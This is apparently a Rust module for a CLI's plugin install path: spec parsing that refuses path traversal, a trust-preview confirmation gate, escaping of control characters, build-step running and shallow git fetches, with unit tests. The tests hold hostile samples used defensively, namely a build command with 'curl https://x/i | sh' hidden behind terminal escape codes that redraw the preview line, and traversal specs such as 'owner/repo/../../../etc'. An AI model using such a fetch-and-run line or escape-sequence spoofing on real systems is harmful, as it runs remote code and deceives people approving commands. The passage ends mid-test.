//! `install`/`link`: shallow GitHub checkouts (or a bare local path), the min-version gate,
//! and herdr's "trust preview" that build/startup commands cannot bypass without explicit
//! confirmation. See plugins.mdx "Trust and
//! security"/"Build commands".

use anyhow::Context as _;
use std::io::{IsTerminal, Write as _};
use std::path::{Path, PathBuf};

use crate::config::Config;
use crate::paths::Paths;

use super::env;
use super::manifest::PluginManifest;

/// Errors `install`/`link` report as a specific, matchable code (via `Error::downcast`)
/// rather than only a formatted message, so the CLI's `{"error":{"code":...}}` envelope
/// can name them (`cli::envelope::code_for`).
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum InstallError {
    #[error(
        "trust_required: this plugin's build and startup commands run only with your \
         confirmation. Pass --yes, or run this at a terminal to answer the prompt"
    )]
    TrustRequired,
    /// A `[[build]]` step that could not run, or ran and failed. `detail` says why, with the last
    /// lines the step printed.
    #[error("plugin_build_failed: plugin '{plugin}': build[{step}] `{command}` {detail}")]
    BuildFailed {
        plugin: String,
        step: usize,
        command: String,
        detail: String,
    },
    #[error(
        "unsupported_plugin_version: plugin requires herdr >= {required}, compat_herdr_version is {compat}"
    )]
    UnsupportedPluginVersion { required: String, compat: String },
    #[error("plugin '{0}' is linked locally; unlink or uninstall it before installing over it")]
    LocalPluginConflict(String),
    #[error(
        "checkout_unreadable: existing checkout at {0} has no readable current commit; \
         refusing to sync it (see the log for the underlying git error)"
    )]
    CheckoutUnreadable(String),
    /// The install spec is not `owner/repo[/subdir][@ref]`, or names a path segment that
    /// would put the checkout outside the managed plugins directory. Always the caller's
    /// input, so it reports as `invalid_argument` rather than the catch-all `internal`.
    #[error("invalid plugin spec '{spec}': {reason}")]
    InvalidSpec { spec: String, reason: String },
}

/// A parsed `owner/repo[/subdir][@ref]` install spec.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Spec {
    pub owner: String,
    pub repo: String,
    pub subdir: Option<String>,
    pub requested_ref: Option<String>,
}

/// Parses `owner/repo[/subdir][@ref]`. The ref, if present, is taken from the last `@`,
/// owner/repo/subdir never contain one.
///
/// Every segment is joined onto `<state>/plugins/github/` by [`checkout_dir`] and
/// [`plugin_dir`], so a segment of `..` walks straight back out of the directory `taw`
/// manages, `taw plugin install ../../x/y` cloned *and built* a plugin outside it,
/// running that plugin's build steps from wherever it landed. `.` and `..` are therefore
/// refused as whole segments. A dot *inside* a segment is untouched: plugin repositories
/// are commonly named `foo.nvim`.
pub fn parse_spec(spec: &str) -> anyhow::Result<Spec> {
    // Split at the last '@' (owner/repo/subdir never contain one); an empty ref (a
    // trailing '@' with nothing after it) is treated as no ref, not an error.
    let (path_part, requested_ref) = match spec.rsplit_once('@') {
        Some((path, r)) => (path, (!r.is_empty()).then(|| r.to_string())),
        None => (spec, None),
    };
    let shape = || InstallError::InvalidSpec {
        spec: spec.to_string(),
        reason: "expected owner/repo[/subdir][@ref]".to_string(),
    };
    let mut parts = path_part.split('/');
    let owner = parts.next().filter(|s| !s.is_empty()).ok_or_else(shape)?;
    let repo = parts.next().filter(|s| !s.is_empty()).ok_or_else(shape)?;
    let rest: Vec<&str> = parts.collect();
    if rest.iter().any(|s| s.is_empty()) {
        return Err(shape().into());
    }
    // Checked over owner and repo too, not just the subdir: `../../x/y` parses with `..`
    // as *both* of them.
    for segment in [owner, repo].into_iter().chain(rest.iter().copied()) {
        if segment == "." || segment == ".." {
            return Err(InstallError::InvalidSpec {
                spec: spec.to_string(),
                reason: format!(
                    "a '{segment}' path segment would install outside the plugins directory"
                ),
            }
            .into());
        }
    }
    let subdir = if rest.is_empty() {
        None
    } else {
        Some(rest.join("/"))
    };
    Ok(Spec {
        owner: owner.to_string(),
        repo: repo.to_string(),
        subdir,
        requested_ref,
    })
}

/// A full 40-character commit id.
pub fn is_full_sha(requested_ref: &str) -> bool {
    requested_ref.len() == 40 && requested_ref.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Refuses, before anything is fetched, a ref that looks like an abbreviated commit (7 to 39
/// hex characters) when the remote answered `ls_remote` and names no branch or tag called
/// that: a fetch asks for a full commit, and git's own error for a short one says nothing of
/// that. `named` is the answer of [`Fetcher::ls_remote`]: `Err` (the remote could not be
/// asked) refuses nothing, since the fetch will say what is wrong.
pub fn refuse_short_sha(
    owner: &str,
    repo: &str,
    requested_ref: Option<&str>,
    named: &anyhow::Result<Option<String>>,
) -> anyhow::Result<()> {
    let Some(r) = requested_ref else {
        return Ok(());
    };
    let short_sha = (7..40).contains(&r.len()) && r.bytes().all(|b| b.is_ascii_hexdigit());
    if short_sha && matches!(named, Ok(None)) {
        return Err(InstallError::InvalidSpec {
            spec: format!("{owner}/{repo}@{r}"),
            reason: "give the full 40-character commit, or a branch or tag".to_string(),
        }
        .into());
    }
    Ok(())
}

/// `<state>/plugins/github/<owner>/<repo>`, where installs made before a folder per commit
/// kept the git checkout, and the stem of a commit's folder name (`<repo>@<12-char sha>`, see
/// [`super::checkout::commit_dir`]). Nothing new is put here: a plugin's record says where its
/// files are. When `spec.subdir` is set, the plugin's own directory is its checkout joined
/// with that subdir (see [`plugin_dir`]).
pub fn checkout_dir(paths: &Paths, owner: &str, repo: &str) -> PathBuf {
    paths.plugins_dir.join("github").join(owner).join(repo)
}

/// The plugin's own directory (containing `herdr-plugin.toml`) within a checkout.
pub fn plugin_dir(checkout: &Path, subdir: Option<&str>) -> PathBuf {
    match subdir {
        Some(s) => checkout.join(s),
        None => checkout.to_path_buf(),
    }
}

/// Checks `manifest.min_herdr_version <= cfg.plugins.compat_herdr_version` with semver.
pub fn check_min_version(cfg: &Config, manifest: &PluginManifest) -> anyhow::Result<()> {
    let required = semver::Version::parse(&manifest.min_herdr_version).with_context(|| {
        format!(
            "plugin '{}': invalid min_herdr_version '{}'",
            manifest.id, manifest.min_herdr_version
        )
    })?;
    let compat = semver::Version::parse(&cfg.plugins.compat_herdr_version).with_context(|| {
        format!(
            "invalid [plugins] compat_herdr_version '{}'",
            cfg.plugins.compat_herdr_version
        )
    })?;
    if required <= compat {
        Ok(())
    } else {
        Err(InstallError::UnsupportedPluginVersion {
            required: required.to_string(),
            compat: compat.to_string(),
        }
        .into())
    }
}

/// Prints every `[[build]]`/`[[startup]]` command this manifest would run (platform-
/// filtered) to stderr, then returns `Ok(())` when the caller may proceed, `yes`, or an
/// interactive `y` answer, or `Err(InstallError::TrustRequired)` otherwise. Never runs
/// anything itself either way: this is purely the confirmation gate, and it is the only
/// place that gate is decided (`install::run` cannot route around it without `yes`).
pub fn gate(manifest: &PluginManifest, yes: bool) -> anyhow::Result<()> {
    gate_with(manifest, None, yes, &terminal_answer)
}

/// Asks for consent after the trust preview: `None` when there is nobody to ask (stdin is
/// not a terminal), or the line typed. [`terminal_answer`] is the real one; a test passes
/// its own, so no test depends on whether its stdin is a terminal.
pub type Answer<'a> = &'a dyn Fn() -> anyhow::Result<Option<String>>;

/// Prompts `Proceed? [y/N]` and reads a line, only when stdin is a terminal.
pub fn terminal_answer() -> anyhow::Result<Option<String>> {
    if !std::io::stdin().is_terminal() {
        return Ok(None);
    }
    eprint!("Proceed? [y/N] ");
    let _ = std::io::stderr().flush();
    let mut line = String::new();
    std::io::stdin().read_line(&mut line)?;
    Ok(Some(line))
}

/// [`gate`] with the question asked by `answer`, and the commit the plugin was fetched at
/// (named in the preview, so a pin to a commit is one the person sees).
pub fn gate_with(
    manifest: &PluginManifest,
    commit: Option<&str>,
    yes: bool,
    answer: Answer,
) -> anyhow::Result<()> {
    print_trust_preview(manifest, commit);
    if confirmed(yes, answer)? {
        Ok(())
    } else {
        Err(InstallError::TrustRequired.into())
    }
}

/// The first line of the trust preview: the plugin, its version and, when it was fetched
/// from a repository, the commit.
fn trust_heading(manifest: &PluginManifest, commit: Option<&str>) -> String {
    let at = commit.map_or_else(String::new, |c| format!(" at commit {c}"));
    format!(
        "Plugin '{}' ({}){at} wants to run the following commands:",
        visible(&manifest.id),
        visible(&manifest.version)
    )
}

/// The lines of the trust preview: the heading, then each command the plugin runs.
fn trust_preview_lines(manifest: &PluginManifest, commit: Option<&str>) -> Vec<String> {
    let mut lines = vec![trust_heading(manifest, commit)];
    for step in manifest.build_steps() {
        lines.push(format!("  [build]   {}", command_line(&step.command)));
    }
    for step in manifest.startup_steps() {
        lines.push(format!("  [startup] {}", command_line(&step.command)));
    }
    if lines.len() == 1 {
        lines.push("  (none)".to_string());
    }
    lines
}

fn print_trust_preview(manifest: &PluginManifest, commit: Option<&str>) {
    for line in trust_preview_lines(manifest, commit) {
        eprintln!("{line}");
    }
}

/// A command as the trust preview and a build error show it: its words joined as a shell would
/// read them.
fn command_line(command: &[String]) -> String {
    visible(&shell_words::join(command))
}

/// `text` with every control character written out (`\x1b`, `\r`, `\n`), and the characters that
/// turn text around or hide it (U+200B to U+200F, U+202A to U+202E, U+2066 to U+2069) as `\u{...}`, so
/// a manifest cannot redraw the line a person reads before approving it.
fn visible(text: &str) -> String {
    use std::fmt::Write as _;
    let mut shown = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '\n' => shown.push_str("\\n"),
            '\r' => shown.push_str("\\r"),
            '\t' => shown.push_str("\\t"),
            c if c.is_ascii_control() => {
                let _ = write!(shown, "\\x{:02x}", u32::from(c));
            }
            c if c.is_control()
                || matches!(c, '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}') =>
            {
                let _ = write!(shown, "\\u{{{:x}}}", u32::from(c));
            }
            c => shown.push(c),
        }
    }
    shown
}

/// `yes`, or, only when stdin is a tty, an interactive `y`/`Y` answer. Never prompts and
/// never treats the absence of an answer as consent: a non-tty stdin with `yes == false`
/// returns `Ok(false)` immediately, without reading anything.
fn confirmed(yes: bool, answer: Answer) -> anyhow::Result<bool> {
    if yes {
        return Ok(true);
    }
    Ok(matches!(
        answer()?.as_deref().map(str::trim),
        Some("y" | "Y")
    ))
}

/// Runs every `[[build]]` step in `plugin_dir`, in manifest order, failing on the first
/// non-zero exit. Build commands do not receive the plugin runtime environment (see
/// plugins.mdx "Build commands": "they do not receive runtime plugin context or Herdr
/// socket env"), only the inherited process environment, minus `HERDR_SOCKET_PATH`/
/// `TAW_SOCKET_PATH` (stripped via [`env::strip_socket_env`], same as [`env::run_sync`]/
/// [`env::spawn_detached`], a `taw` running inside a real herdr session must not leak its
/// live socket path to a plugin's build step either), with its output passed on to the terminal
/// as it is read ([`run_showing_output`]).
pub fn run_build_commands(manifest: &PluginManifest, plugin_dir: &Path) -> anyhow::Result<()> {
    for (idx, step) in manifest.build_steps().enumerate() {
        let (prog, args) = step.command.split_first().ok_or_else(|| {
            anyhow::anyhow!(
                "plugin '{}': build[{idx}] has an empty command",
                manifest.id
            )
        })?;
        let mut cmd = std::process::Command::new(prog);
        cmd.args(args).current_dir(plugin_dir);
        env::strip_socket_env(&mut cmd);
        env::strip_pane_context_env(&mut cmd);
        let failed = |detail: String| {
            anyhow::Error::new(InstallError::BuildFailed {
                plugin: visible(&manifest.id),
                step: idx,
                command: command_line(&step.command),
                detail,
            })
        };
        let (status, tail) = match run_showing_output(&mut cmd) {
            Ok(done) => done,
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
                let prog = visible(prog);
                return Err(failed(format!(
                    "could not run: {prog}: command not found (is {prog} installed?)"
                )));
            }
            Err(err) => return Err(failed(format!("could not run: {err}"))),
        };
        if !status.success() {
            let mut detail = format!("failed ({status})");
            if !tail.is_empty() {
                detail.push_str("; the last lines it printed:\n");
                detail.push_str(&tail.join("\n"));
            }
            return Err(failed(detail));
        }
    }
    Ok(())
}

/// How many of a build step's last lines an error shows.
const BUILD_TAIL_LINES: usize = 12;

/// How long the output of a build step that has exited is still waited for. A step can leave a
/// process behind that holds its output open (`npm run watch &`, a build daemon), and the end of
/// that output would never come.
const BUILD_OUTPUT_GRACE: std::time::Duration = std::time::Duration::from_secs(2);

/// Runs `cmd` with its output going to this process's own stdout and stderr as it comes (the
/// build's progress), and returns how it ended with the last lines it printed.
fn run_showing_output(
    cmd: &mut std::process::Command,
) -> std::io::Result<(std::process::ExitStatus, Vec<String>)> {
    run_passing_output(
        cmd,
        Box::new(std::io::stdout()),
        Box::new(std::io::stderr()),
    )
}

type Sink = Box<dyn std::io::Write + Send>;

/// [`run_showing_output`] with the step's stdout passed to `out` and its stderr to `err`, each chunk
/// as soon as it is read, so a prompt with no newline after it shows.
///
/// Output is passed on only until the step has exited and its output has ended, or the grace
/// period ([`BUILD_OUTPUT_GRACE`]) after its exit is over. What a process the step left behind
/// writes after that is read and thrown away, never passed on, so nothing of it lands on stdout
/// next to the JSON answer taw prints there. Once taw has exited, such a process gets an error
/// (`EPIPE`) on its next write (before taw read a step's output, it wrote to the terminal).
fn run_passing_output(
    cmd: &mut std::process::Command,
    out: Sink,
    err: Sink,
) -> std::io::Result<(std::process::ExitStatus, Vec<String>)> {
    use std::io::Read as _;
    use std::sync::{Arc, Mutex};
    cmd.stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    let mut child = cmd.spawn()?;
    let tail: Arc<Mutex<std::collections::VecDeque<String>>> = Arc::default();
    let keep = |tail: &Mutex<std::collections::VecDeque<String>>, line: &[u8]| {
        let text = String::from_utf8_lossy(line).trim_end().to_string();
        if !text.is_empty()
            && let Ok(mut tail) = tail.lock()
        {
            if tail.len() == BUILD_TAIL_LINES {
                tail.pop_front();
            }
            tail.push_back(text);
        }
    };
    let (done_tx, done_rx) = std::sync::mpsc::channel::<()>();
    // Whether output is still passed on: held while a chunk is written, so once it is set to false
    // no reader writes again.
    let passing = Arc::new(Mutex::new(true));
    let mut readers = 0;
    let stdout = child
        .stdout
        .take()
        .map(|s| Box::new(s) as Box<dyn std::io::Read + Send>);
    let stderr = child
        .stderr
        .take()
        .map(|s| Box::new(s) as Box<dyn std::io::Read + Send>);
    for (stream, mut sink) in [(stdout, out), (stderr, err)] {
        let Some(mut stream) = stream else { continue };
        let tail = Arc::clone(&tail);
        let done = done_tx.clone();
        let passing = Arc::clone(&passing);
        readers += 1;
        // A reader that is still blocked when the grace period ends is left to end with the pipe,
        // reading what comes and passing none of it on.
        std::thread::spawn(move || {
            let mut chunk = [0u8; 4096];
            let mut line = Vec::new();
            loop {
                let n = match stream.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => n,
                    Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
                    Err(_) => break,
                };
                if let Ok(passing) = passing.lock()
                    && *passing
                {
                    let _ = sink.write_all(&chunk[..n]);
                    let _ = sink.flush();
                }
                for &byte in &chunk[..n] {
                    if byte == b'\n' {
                        keep(&tail, &line);
                        line.clear();
                    } else {
                        line.push(byte);
                    }
                }
            }
            keep(&tail, &line);
            let _ = done.send(());
        });
    }
    drop(done_tx);
    let status = child.wait()?;
    let deadline = std::time::Instant::now() + BUILD_OUTPUT_GRACE;
    for _ in 0..readers {
        let left = deadline.saturating_duration_since(std::time::Instant::now());
        if done_rx.recv_timeout(left).is_err() {
            break;
        }
    }
    if let Ok(mut passing) = passing.lock() {
        *passing = false;
    }
    let tail = tail
        .lock()
        .map(|t| t.iter().cloned().collect())
        .unwrap_or_default();
    Ok((status, tail))
}

/// Fetches `requested_ref` (the remote's default branch when `None`) from `url` into a new
/// checkout at `dir`, which must not exist yet, and checks out the commit it names (an
/// annotated tag peeled to its commit). Returns that commit. Nothing outside `dir` is
/// touched, so an update can stage a new commit beside the live checkout.
pub fn fetch_into(dir: &Path, url: &str, requested_ref: Option<&str>) -> anyhow::Result<String> {
    let dir_str = dir
        .to_str()
        .ok_or_else(|| anyhow::anyhow!("checkout path {} is not valid UTF-8", dir.display()))?;
    if let Some(parent) = dir.parent() {
        std::fs::create_dir_all(parent)
            .with_context(|| format!("creating {}", parent.display()))?;
    }
    run_git(&["init", "-q", dir_str])?;
    run_git(&["-C", dir_str, "remote", "add", "origin", url])?;
    run_git(&[
        "-C",
        dir_str,
        "fetch",
        "-q",
        "--depth",
        "1",
        "origin",
        requested_ref.unwrap_or("HEAD"),
    ])?;
    // `^{commit}` peels an annotated tag to the commit it names.
    let commit = run_git_capture(&["-C", dir_str, "rev-parse", "FETCH_HEAD^{commit}"])?
        .trim()
        .to_string();
    run_git(&["-C", dir_str, "checkout", "-q", "--detach", &commit])?;
    Ok(commit)
}

/// Where a plugin's commit comes from: the two git reads an install or an update makes of
/// a remote. [`GitFetcher`] is the real one; a test passes its own to count the calls, so a
/// test stands a local repository in for GitHub without touching the network.
pub trait Fetcher {
    /// The commit `requested_ref` (the remote's default branch when `None`) names on `url`
    /// now, asked of the remote without downloading anything (`git ls-remote`); an
    /// annotated tag is peeled to its commit. `None` when the remote names no such ref.
    fn ls_remote(&self, url: &str, requested_ref: Option<&str>) -> anyhow::Result<Option<String>>;
    /// Fetches that ref into a new folder `dir`; see [`fetch_into`].
    fn fetch(&self, dir: &Path, url: &str, requested_ref: Option<&str>) -> anyhow::Result<String>;
}

/// [`Fetcher`] over the `git` on the PATH.
pub struct GitFetcher;

impl Fetcher for GitFetcher {
    fn ls_remote(&self, url: &str, requested_ref: Option<&str>) -> anyhow::Result<Option<String>> {
        ls_remote(url, requested_ref)
    }
    fn fetch(&self, dir: &Path, url: &str, requested_ref: Option<&str>) -> anyhow::Result<String> {
        fetch_into(dir, url, requested_ref)
    }
}

/// `git ls-remote`: a tag (peeled) before a tag before a branch, as `git fetch <name>` picks.
fn ls_remote(url: &str, requested_ref: Option<&str>) -> anyhow::Result<Option<String>> {
    let patterns: Vec<String> = match requested_ref {
        None => vec!["HEAD".to_string()],
        Some(r) => vec![
            format!("refs/heads/{r}"),
            format!("refs/tags/{r}"),
            format!("refs/tags/{r}^{{}}"),
        ],
    };
    let mut args = vec!["ls-remote", url];
    args.extend(patterns.iter().map(String::as_str));
    let out = run_git_capture(&args)?;
    let (mut peeled, mut tag, mut head) = (None, None, None);
    for line in out.lines() {
        let Some((sha, name)) = line.split_once('\t') else {
            continue;
        };
        let sha = Some(sha.to_string());
        if name.ends_with("^{}") {
            peeled = sha;
        } else if name.starts_with("refs/tags/") {
            tag = sha;
        } else {
            head = sha;
        }
    }
    Ok(peeled.or(tag).or(head))
}

fn run_git(args: &[&str]) -> anyhow::Result<()> {
    let status = crate::git::command()
        .args(args)
        .status()
        .with_context(|| format!("running `git {}`", args.join(" ")))?;
    anyhow::ensure!(
        status.success(),
        "`git {}` failed ({status})",
        args.join(" ")
    );
    Ok(())
}

fn run_git_capture(args: &[&str]) -> anyhow::Result<String> {
    let output = crate::git::command()
        .args(args)
        .output()
        .with_context(|| format!("running `git {}`", args.join(" ")))?;
    anyhow::ensure!(
        output.status.success(),
        "`git {}` failed ({})",
        args.join(" "),
        output.status
    );
    Ok(String::from_utf8_lossy(&output.stdout).into_owned())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::plugin::manifest;
    use crate::plugin::tests_support::SOCKET_ENV_LOCK;

    #[test]
    fn parse_spec_handles_owner_repo() {
        let spec = parse_spec("someone/plugin-examples").unwrap();
        assert_eq!(spec.owner, "someone");
        assert_eq!(spec.repo, "plugin-examples");
        assert_eq!(spec.subdir, None);
        assert_eq!(spec.requested_ref, None);
    }

    #[test]
    fn parse_spec_handles_owner_repo_subdir() {
        let spec = parse_spec("someone/plugin-examples/agent-telegram-notify").unwrap();
        assert_eq!(spec.owner, "someone");
        assert_eq!(spec.repo, "plugin-examples");
        assert_eq!(spec.subdir.as_deref(), Some("agent-telegram-notify"));
        assert_eq!(spec.requested_ref, None);
    }

    #[test]
    fn parse_spec_handles_a_nested_subdir_and_a_ref() {
        let spec = parse_spec("owner/repo/nested/subdir@v1.2.3").unwrap();
        assert_eq!(spec.owner, "owner");
        assert_eq!(spec.repo, "repo");
        assert_eq!(spec.subdir.as_deref(), Some("nested/subdir"));
        assert_eq!(spec.requested_ref.as_deref(), Some("v1.2.3"));
    }

    #[test]
    fn parse_spec_handles_owner_repo_at_ref_with_no_subdir() {
        let spec = parse_spec("owner/repo@main").unwrap();
        assert_eq!(spec.subdir, None);
        assert_eq!(spec.requested_ref.as_deref(), Some("main"));
    }

    #[test]
    fn parse_spec_rejects_a_bare_owner() {
        assert!(parse_spec("owner").is_err());
        assert!(parse_spec("").is_err());
    }

    #[test]
    fn parse_spec_refuses_a_spec_that_would_escape_the_plugins_directory() {
        // Every segment of a spec is joined onto `<state>/plugins/github/`, so a `..`
        // segment walks back out of it: `taw plugin install ../../x/y` would clone and
        // *build* a plugin outside the directory `taw` manages, running its build steps
        // from wherever that landed.
        for escaping in [
            "../../x/y",
            "../owner/repo",
            "owner/../repo",
            "owner/repo/../..",
            "owner/repo/../../../etc",
            "owner/repo/sub/..",
            "..",
            "../..",
            "owner/repo/..@main",
        ] {
            let result = parse_spec(escaping);
            assert!(
                result.is_err(),
                "{escaping:?} must be refused, got {result:?}"
            );
        }

        // `.` is not traversal but is not a repository name either, and it would make the
        // checkout path a different spelling of its own parent.
        for odd in [".", "./repo", "owner/."] {
            assert!(parse_spec(odd).is_err(), "{odd:?} must be refused");
        }

        // An absolute path was already refused by the empty-first-segment check; pinned
        // here so that stays true.
        assert!(parse_spec("/etc/passwd").is_err());

        // And nothing legitimate became collateral: a dot *inside* a segment is fine,
        // which matters because plugin repos are commonly named `foo.nvim`/`x.y`.
        assert_eq!(
            parse_spec("owner/repo.nvim/sub.dir")
                .unwrap()
                .subdir
                .as_deref(),
            Some("sub.dir")
        );
        assert_eq!(parse_spec("own.er/re..po").unwrap().owner, "own.er");
    }

    #[test]
    fn checkout_dir_ignores_subdir_it_is_the_repo_root() {
        let dir = tempfile::tempdir().unwrap();
        let plugins_dir = dir.path().join("plugins");
        let paths = Paths {
            config_dir: dir.path().join("config"),
            config_file: dir.path().join("config.toml"),
            state_dir: dir.path().to_path_buf(),
            override_dir: dir.path().join("agent-detection"),
            remote_manifest_dir: dir.path().join("agent-detection/remote"),
            sessions_dir: dir.path().join("sessions"),
            plugin_state_dir: plugins_dir.join("state"),
            plugins_dir,
            logs_dir: dir.path().join("logs"),
            manifest_marker: dir.path().join("agent-detection/last-check"),
        };
        let checkout = checkout_dir(&paths, "owner", "repo");
        assert_eq!(checkout, dir.path().join("plugins/github/owner/repo"));
        assert_eq!(
            plugin_dir(&checkout, Some("subdir")),
            checkout.join("subdir")
        );
        assert_eq!(plugin_dir(&checkout, None), checkout);
    }

    fn manifest_with_min_version(min: &str) -> PluginManifest {
        manifest::parse(&format!(
            r#"
id = "x"
version = "1.0.0"
min_herdr_version = "{min}"
"#
        ))
        .unwrap()
    }

    #[test]
    fn check_min_version_passes_when_required_is_at_most_compat() {
        let cfg = Config::default(); // compat_herdr_version = "0.9.3"
        assert!(check_min_version(&cfg, &manifest_with_min_version("0.7.0")).is_ok());
        assert!(check_min_version(&cfg, &manifest_with_min_version("0.8.2")).is_ok());
        assert!(check_min_version(&cfg, &manifest_with_min_version("0.9.3")).is_ok());
    }

    #[test]
    fn check_min_version_fails_when_required_is_newer_than_compat() {
        let cfg = Config::default();
        let err = check_min_version(&cfg, &manifest_with_min_version("9.9.9")).unwrap_err();
        assert_eq!(
            err.downcast_ref::<InstallError>(),
            Some(&InstallError::UnsupportedPluginVersion {
                required: "9.9.9".to_string(),
                compat: "0.9.3".to_string(),
            })
        );
    }

    #[test]
    fn check_min_version_rejects_an_unparseable_version() {
        let cfg = Config::default();
        assert!(check_min_version(&cfg, &manifest_with_min_version("not-a-version")).is_err());
    }

    // The answer is injected, so these hold whether or not the test's stdin is a terminal.
    #[test]
    fn confirmed_is_true_when_yes_is_passed_without_asking() {
        assert!(confirmed(true, &|| panic!("yes must not ask")).unwrap());
    }

    #[test]
    fn confirmed_is_false_without_yes_when_nobody_can_be_asked() {
        assert!(!confirmed(false, &|| Ok(None)).unwrap());
    }

    #[test]
    fn confirmed_takes_only_a_typed_y_as_consent() {
        assert!(confirmed(false, &|| Ok(Some("y\n".to_string()))).unwrap());
        assert!(confirmed(false, &|| Ok(Some(" Y \n".to_string()))).unwrap());
        assert!(!confirmed(false, &|| Ok(Some("n\n".to_string()))).unwrap());
        assert!(!confirmed(false, &|| Ok(Some("\n".to_string()))).unwrap());
    }

    #[test]
    fn gate_cannot_be_bypassed_without_yes_and_reports_trust_required() {
        let manifest = manifest::parse(
            r#"
id = "x"
version = "1.0.0"
min_herdr_version = "0.7.0"

[[build]]
command = ["npm", "ci"]
"#,
        )
        .unwrap();

        let err = gate(&manifest, false).unwrap_err();
        assert_eq!(
            err.downcast_ref::<InstallError>(),
            Some(&InstallError::TrustRequired)
        );
    }

    #[test]
    fn gate_proceeds_when_yes_is_true() {
        let manifest = manifest::parse(
            r#"
id = "x"
version = "1.0.0"
min_herdr_version = "0.7.0"

[[build]]
command = ["npm", "ci"]
"#,
        )
        .unwrap();

        assert!(gate(&manifest, true).is_ok());
    }

    #[test]
    fn the_trust_preview_names_the_commit_the_plugin_was_fetched_at() {
        let manifest =
            manifest::parse("id = \"x\"\nversion = \"1.0.0\"\nmin_herdr_version = \"0.7.0\"\n")
                .unwrap();
        let commit = "0123456789abcdef0123456789abcdef01234567";

        let heading = trust_heading(&manifest, Some(commit));

        assert!(
            heading.contains(&format!("at commit {commit}")),
            "{heading}"
        );
        assert!(heading.starts_with("Plugin 'x' (1.0.0)"), "{heading}");
        assert!(!trust_heading(&manifest, None).contains("commit"));
    }

    /// A manifest whose id, version or command words hold control characters (TOML takes
    /// `\u001b` and `\r`) shows them written out in the preview and in a build error, so a
    /// command cannot redraw its own line to look like another.
    #[test]
    fn the_trust_preview_and_a_build_error_show_control_characters_written_out() {
        let manifest = manifest::parse(
            r#"
id = "evil\u001b[2K\rgood"
version = "1.0\r\n2.0"
min_herdr_version = "0.7.0"

[[build]]
command = ["sh", "-c", "exit 3 # curl https://x/i | sh\u001b[2K\r  [build]   npm ci"]

[[startup]]
command = ["sh", "-c", "run\u202edaemon\u0085\u007f"]
"#,
        )
        .unwrap();
        let lines = trust_preview_lines(&manifest, None);
        assert_eq!(
            lines,
            [
                "Plugin 'evil\\x1b[2K\\rgood' (1.0\\r\\n2.0) wants to run the following commands:",
                "  [build]   sh -c 'exit 3 # curl https://x/i | sh\\x1b[2K\\r  [build]   npm ci'",
                "  [startup] sh -c run\\u{202e}daemon\\u{85}\\x7f",
            ]
        );
        let dir = tempfile::tempdir().unwrap();
        let err = run_build_commands(&manifest, dir.path())
            .unwrap_err()
            .to_string();
        assert!(
            err.starts_with(
                "plugin_build_failed: plugin 'evil\\x1b[2K\\rgood': build[0] `sh -c 'exit 3 # curl https://x/i | sh\\x1b[2K\\r  [build]   npm ci'` failed"
            ),
            "{err:?}"
        );
    }

    /// What a build step prints, kept for a test to look at.
    #[derive(Clone, Default)]
    struct Kept(std::sync::Arc<std::sync::Mutex<Vec<u8>>>);
    impl std::io::Write for Kept {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            self.0.lock().unwrap().extend_from_slice(buf);
            Ok(buf.len())
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }
    impl Kept {
        fn text(&self) -> String {
            String::from_utf8_lossy(&self.0.lock().unwrap()).into_owned()
        }
    }

    /// A build step that leaves a process behind holding its output open ends when the step ends,
    /// after the short grace period, not when that process does.
    #[test]
    fn a_build_step_that_leaves_a_process_holding_its_output_returns_when_it_exits() {
        let dir = tempfile::tempdir().unwrap();
        let pid_file = dir.path().join("pid");
        let mut cmd = std::process::Command::new("sh");
        cmd.args(["-c", "echo building; sleep 30 & echo $! > pid; echo built"])
            .current_dir(dir.path());
        struct Guard(std::path::PathBuf);
        impl Drop for Guard {
            fn drop(&mut self) {
                if let Some(pid) = std::fs::read_to_string(&self.0)
                    .ok()
                    .and_then(|pid| pid.trim().parse::<libc::pid_t>().ok())
                {
                    // SAFETY: a signal to the sleeper this test's step started, by its pid.
                    unsafe { libc::kill(pid, libc::SIGKILL) };
                }
            }
        }
        let _guard = Guard(pid_file.clone());
        let out = Kept::default();
        let started = std::time::Instant::now();
        let (status, tail) =
            run_passing_output(&mut cmd, Box::new(out.clone()), Box::new(Kept::default())).unwrap();
        let took = started.elapsed();
        assert!(status.success());
        assert!(pid_file.exists());
        assert!(took < std::time::Duration::from_secs(10), "took {took:?}");
        assert_eq!(tail, ["building", "built"]);
        assert_eq!(out.text(), "building\nbuilt\n");
    }

    /// What a process a build step left behind writes after the grace period is not passed on, so
    /// nothing lands on stdout next to the JSON answer taw prints there.
    #[test]
    fn output_a_left_process_writes_after_the_grace_is_not_passed_on() {
        let dir = tempfile::tempdir().unwrap();
        let pid_file = dir.path().join("pid");
        let mut cmd = std::process::Command::new("sh");
        cmd.args([
            "-c",
            "echo building; (i=0; while [ ! -e go ] && [ $i -lt 600 ]; do sleep 0.05; i=$((i+1)); done; echo late; echo late >&2) & echo $! > pid; echo built",
        ])
        .current_dir(dir.path());
        struct Guard(std::path::PathBuf);
        impl Drop for Guard {
            fn drop(&mut self) {
                if let Some(pid) = std::fs::read_to_string(&self.0)
                    .ok()
                    .and_then(|pid| pid.trim().parse::<libc::pid_t>().ok())
                {
                    // SAFETY: a signal to the process this test's step left, by its pid.
                    unsafe { libc::kill(pid, libc::SIGKILL) };
                }
            }
        }
        let _guard = Guard(pid_file.clone());
        let (out, err) = (Kept::default(), Kept::default());
        let (status, tail) =
            run_passing_output(&mut cmd, Box::new(out.clone()), Box::new(err.clone())).unwrap();
        assert!(status.success());
        assert_eq!(tail, ["building", "built"]);
        std::fs::write(dir.path().join("go"), "").unwrap();
        // The readers drop their sinks once the left process has written and closed its output.
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        while (std::sync::Arc::strong_count(&out.0) > 1 || std::sync::Arc::strong_count(&err.0) > 1)
            && std::time::Instant::now() < deadline
